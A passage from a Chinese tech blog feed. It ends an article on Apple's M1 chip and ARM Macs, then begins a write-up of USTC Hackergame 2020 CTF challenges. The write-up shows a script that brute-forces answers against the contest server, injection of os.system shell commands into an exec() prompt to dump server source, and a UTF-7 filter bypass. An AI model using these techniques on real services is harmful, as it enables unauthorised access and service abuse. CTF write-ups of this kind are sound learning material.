Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a 